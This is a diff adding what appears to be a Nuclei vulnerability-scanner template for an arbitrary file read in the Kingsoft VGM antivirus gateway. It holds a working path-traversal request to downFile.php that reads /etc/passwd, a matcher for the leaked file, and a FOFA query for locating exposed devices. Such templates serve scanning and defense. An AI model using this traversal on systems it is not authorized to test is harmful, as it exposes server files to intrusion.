@@ -1,0 +1,36 @@
+id: kingsoft-vgm-lfi
+
+info:
+  name: Kingsoft VGM Antivirus - Arbitrary File Read
+  author: xc
+  severity: high
+  description: |
+    There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the server through the vulnerability.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: title="金山VGM防毒墙"
+  tags: kingsoft,vgm,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/downFile.php?filename=../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022100f2502080be7eb0c3cc36d778e65dac2e50b2dc8930e92e8253154de9305015ab0220536c3849100109e24770d3ade708928f6be51ee39cb53ef97cb149042ae724c9:922c64590222798bb761d5b6d8e72950
